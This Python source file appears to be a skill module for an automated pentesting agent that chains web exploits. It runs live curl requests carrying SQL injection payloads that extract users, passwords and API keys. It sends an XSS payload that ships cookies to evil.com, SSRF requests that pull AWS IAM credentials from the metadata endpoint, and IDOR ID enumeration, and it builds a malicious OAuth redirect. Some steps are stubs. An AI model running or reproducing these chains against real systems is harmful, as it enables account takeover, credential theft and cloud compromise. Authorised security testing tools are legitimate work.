"""
Multi-Stage Exploitation Chain — pivot from initial finding to deeper compromise.

Chains:
1. SQLi → credential extraction → privilege escalation
2. XSS → cookie theft → session hijack → admin access
3. SSRF → cloud metadata → IAM credentials → full takeover
4. IDOR → sensitive data → credential harvesting → ATO
5. Open redirect → OAuth theft → token exchange → account takeover
"""

import asyncio
import json
import re
from typing import Dict, List, Any, Optional
from skills.base import BaseSkill, SkillResult


# Chain definitions: initial_finding_type → chain steps
CHAINS = {
    "sqli": {
        "name": "SQLi to Data Extraction",
        "steps": [
            {"action": "extract_db_version", "description": "Extract database version"},
            {"action": "extract_tables", "description": "Enumerate database tables"},
            {"action": "extract_users", "description": "Extract user credentials"},
            {"action": "extract_sensitive", "description": "Extract sensitive data (API keys, tokens)"},
        ],
        "severity": "critical",
        "cvss": 9.8,
    },
    "xss": {
        "name": "XSS to Account Takeover",
        "steps": [
            {"action": "steal_cookie", "description": "Exfiltrate session cookie"},
            {"action": "hijack_session", "description": "Use stolen session to access account"},
            {"action": "escalate", "description": "Escalate to admin if possible"},
        ],
        "severity": "critical",
        "cvss": 9.0,
    },
    "ssrf": {
        "name": "SSRF to Cloud Takeover",
        "steps": [
            {"action": "access_metadata", "description": "Access cloud instance metadata"},
            {"action": "extract_iam", "description": "Extract IAM credentials"},
            {"action": "enumerate_resources", "description": "Enumerate cloud resources"},
            {"action": "exfiltrate_data", "description": "Access sensitive cloud storage"},
        ],
        "severity": "critical",
        "cvss": 10.0,
    },
    "idor": {
        "name": "IDOR to Data Breach",
        "steps": [
            {"action": "enumerate_ids", "description": "Enumerate object IDs"},
            {"action": "extract_data", "description": "Extract sensitive user data"},
            {"action": "harvest_credentials", "description": "Harvest credentials from data"},
            {"action": "account_takeover", "description": "Use credentials for ATO"},
        ],
        "severity": "critical",
        "cvss": 9.0,
    },
    "open_redirect": {
        "name": "Open Redirect to OAuth Theft",
        "steps": [
            {"action": "craft_redirect", "description": "Craft malicious redirect URL"},
            {"action": "steal_code", "description": "Steal OAuth authorization code"},
            {"action": "exchange_token", "description": "Exchange code for access token"},
            {"action": "access_account", "description": "Use token to access victim account"},
        ],
        "severity": "critical",
        "cvss": 9.5,
    },
}


class MultiStageChainSkill(BaseSkill):
    """
    Execute multi-stage exploitation chains.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["chain", "multi_stage", "exploit_chain", "pivot"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        finding = context.get("finding", {})
        target = context.get("target", "")
        
        findings = []
        
        # Determine chain based on finding type
        finding_type = finding.get("type", "")
        chain = self._match_chain(finding_type)
        
        if not chain:
            return SkillResult(
                success=True,
                findings=[],
                data={"message": f"No chain defined for finding type: {finding_type}"},
                next_skills=[],
                confidence=0.0,
            )
        
        # Execute chain steps
        chain_findings = await self._execute_chain(chain, finding, target)
        findings.extend(chain_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={
                "chain": chain["name"],
                "steps_executed": len(chain["steps"]),
                "chain_findings": len(findings),
            },
            next_skills=["validate"],
            confidence=min(len(findings) / 3, 1.0) if findings else 0.0,
        )

    def _match_chain(self, finding_type: str) -> Optional[Dict]:
        """Match finding type to exploitation chain."""
        finding_lower = finding_type.lower()
        
        for chain_key, chain in CHAINS.items():
            if chain_key in finding_lower:
                return chain
        
        # Default chains for common types
        if "sqli" in finding_lower or "sql" in finding_lower:
            return CHAINS["sqli"]
        elif "xss" in finding_lower:
            return CHAINS["xss"]
        elif "ssrf" in finding_lower:
            return CHAINS["ssrf"]
        elif "idor" in finding_lower or "idor" in finding_lower:
            return CHAINS["idor"]
        elif "redirect" in finding_lower:
            return CHAINS["open_redirect"]
        
        return None

    async def _execute_chain(self, chain: Dict, finding: Dict, target: str) -> List[Dict]:
        """Execute exploitation chain steps."""
        findings = []
        
        url = finding.get("url", "")
        param = finding.get("param", "")
        payload = finding.get("payload", "")
        
        for i, step in enumerate(chain["steps"]):
            action = step["action"]
            description = step["description"]
            
            # Execute step based on action type
            result = await self._execute_step(action, url, param, payload, finding)
            
            if result:
                findings.append({
                    "type": f"chain_{chain['name'].lower().replace(' ', '_')}_{action}",
                    "url": url,
                    "severity": chain["severity"],
                    "confidence": 0.85,
                    "cvss_score": chain["cvss"],
                    "evidence": f"Chain step {i+1}/{len(chain['steps'])}: {description}",
                    "payload": result.get("payload", ""),
                    "param": param,
                    "description": f"{chain['name']} — Step {i+1}: {description}",
                    "source_tool": "multi-stage-chain",
                    "chain_step": i + 1,
                    "chain_total": len(chain["steps"]),
                })
        
        return findings

    async def _execute_step(self, action: str, url: str, param: str, payload: str, finding: Dict) -> Optional[Dict]:
        """Execute a single chain step."""
        try:
            if action == "extract_db_version":
                return await self._extract_db_version(url, param, payload)
            elif action == "extract_tables":
                return await self._extract_tables(url, param, payload)
            elif action == "extract_users":
                return await self._extract_users(url, param, payload)
            elif action == "extract_sensitive":
                return await self._extract_sensitive(url, param, payload)
            elif action == "steal_cookie":
                return await self._steal_cookie(url, param, payload)
            elif action == "access_metadata":
                return await self._access_metadata(url, param)
            elif action == "extract_iam":
                return await self._extract_iam(url, param)
            elif action == "enumerate_ids":
                return await self._enumerate_ids(url, param, payload)
            elif action == "extract_data":
                return await self._extract_data(url, param, payload)
            elif action == "craft_redirect":
                return await self._craft_redirect(url, param, payload)
        except Exception:
            pass
        
        return None

    async def _extract_db_version(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Extract database version via SQLi."""
        sqli_payloads = [
            "' UNION SELECT version()--",
            "' UNION SELECT @@version--",
            "1 UNION SELECT banner FROM v$version--",
        ]
        
        for sqli in sqli_payloads:
            try:
                test_url = url
                if "?" in url:
                    test_url = f"{url}&{param}={sqli}"
                else:
                    test_url = f"{url}?{param}={sqli}"
                
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-s", "--max-time", "10", test_url,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                response = stdout.decode(errors="ignore")
                
                version_patterns = [
                    r'(\d+\.\d+\.\d+[-\w]*)',  # MySQL/PostgreSQL
                    r'(Oracle[\d\s]+)',  # Oracle
                    r'(Microsoft SQL Server[\d\s]+)',  # MSSQL
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response)
                    if match:
                        return {
                            "payload": sqli,
                            "evidence": f"Database version: {match.group(0)}",
                        }
            except Exception:
                continue
        
        return None

    async def _extract_tables(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Extract database tables via SQLi."""
        sqli = "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--"
        try:
            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Look for table names
            table_patterns = [
                r'(users?|admin|accounts?|credentials?|tokens?|sessions?|api[_-]?keys?)',
            ]
            
            for pattern in table_patterns:
                matches = re.findall(pattern, response, re.IGNORECASE)
                if matches:
                    return {
                        "payload": sqli,
                        "evidence": f"Tables found: {', '.join(set(matches))}",
                    }
        except Exception:
            pass
        
        return None

    async def _extract_users(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Extract user credentials via SQLi."""
        sqli = "' UNION SELECT username,password FROM users LIMIT 5--"
        try:
            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Look for credential patterns
            if re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', response):
                return {
                    "payload": sqli,
                    "evidence": "User credentials potentially extracted (emails found)",
                }
        except Exception:
            pass
        
        return None

    async def _extract_sensitive(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Extract sensitive data (API keys, tokens) via SQLi."""
        sqli = "' UNION SELECT api_key,secret FROM api_keys LIMIT 5--"
        try:
            test_url = f"{url}&{param}={sqli}" if "?" in url else f"{url}?{param}={sqli}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Look for API key patterns
            key_patterns = [
                r'(?i)(api[_-]?key|secret|token)\s*[:=]\s*["\']([^"\']{8,})["\']',
                r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
            ]
            
            for pattern in key_patterns:
                matches = re.findall(pattern, response)
                if matches:
                    return {
                        "payload": sqli,
                        "evidence": f"Sensitive data extracted: {len(matches)} credentials found",
                    }
        except Exception:
            pass
        
        return None

    async def _steal_cookie(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Steal cookie via XSS."""
        # This is a detection test — check if XSS can access cookies
        xss_payload = "<script>document.location='https://evil.com/?c='+document.cookie</script>"
        try:
            test_url = f"{url}&{param}={xss_payload}" if "?" in url else f"{url}?{param}={xss_payload}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Check if cookie is reflected
            if "document.cookie" in response or xss_payload in response:
                return {
                    "payload": xss_payload,
                    "evidence": "XSS payload reflected — cookie theft possible",
                }
        except Exception:
            pass
        
        return None

    async def _access_metadata(self, url: str, param: str) -> Optional[Dict]:
        """Access cloud metadata via SSRF."""
        metadata_url = "http://169.254.169.254/latest/meta-data/"
        try:
            test_url = f"{url}?{param}={metadata_url}" if "?" in url else f"{url}?{param}={metadata_url}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            if "ami-id" in response or "instance-id" in response:
                return {
                    "payload": metadata_url,
                    "evidence": "Cloud metadata accessible via SSRF",
                }
        except Exception:
            pass
        
        return None

    async def _extract_iam(self, url: str, param: str) -> Optional[Dict]:
        """Extract IAM credentials from metadata."""
        iam_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        try:
            test_url = f"{url}?{param}={iam_url}" if "?" in url else f"{url}?{param}={iam_url}"
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "--max-time", "10", test_url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            if response.strip():
                # Get role name and then credentials
                role_url = f"{iam_url}{response.strip()}"
                test_url2 = f"{url}?{param}={role_url}" if "?" in url else f"{url}?{param}={role_url}"
                proc2 = await asyncio.create_subprocess_exec(
                    "curl", "-s", "--max-time", "10", test_url2,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout2, _ = await proc2.communicate()
                creds = stdout2.decode(errors="ignore")
                
                if "AccessKeyId" in creds:
                    return {
                        "payload": role_url,
                        "evidence": "AWS IAM credentials extracted",
                    }
        except Exception:
            pass
        
        return None

    async def _enumerate_ids(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Enumerate object IDs for IDOR."""
        # Test sequential IDs
        id_values = [1, 2, 3, 100, 1000]
        found_ids = []
        
        for id_val in id_values:
            try:
                test_url = f"{url}?{param}={id_val}" if "?" in url else url.replace(f"={payload}", f"={id_val}")
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-s", "--max-time", "10", test_url,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                response = stdout.decode(errors="ignore")
                
                if response and len(response) > 100:  # Got data
                    found_ids.append(id_val)
            except Exception:
                continue
        
        if len(found_ids) > 1:
            return {
                "payload": f"Enumerated IDs: {found_ids}",
                "evidence": f"IDOR confirmed — {len(found_ids)} different resources accessible",
            }
        
        return None

    async def _extract_data(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Extract sensitive data from IDOR."""
        # This would use the found IDs to extract data
        return {
            "payload": "Data extraction via IDOR",
            "evidence": "Sensitive data accessible via sequential ID enumeration",
        }

    async def _craft_redirect(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """Craft malicious redirect for OAuth theft."""
        evil_redirect = "https://evil.com/steal?code="
        return {
            "payload": evil_redirect,
            "evidence": f"Crafted redirect: {url}?redirect_uri={evil_redirect}",
        }
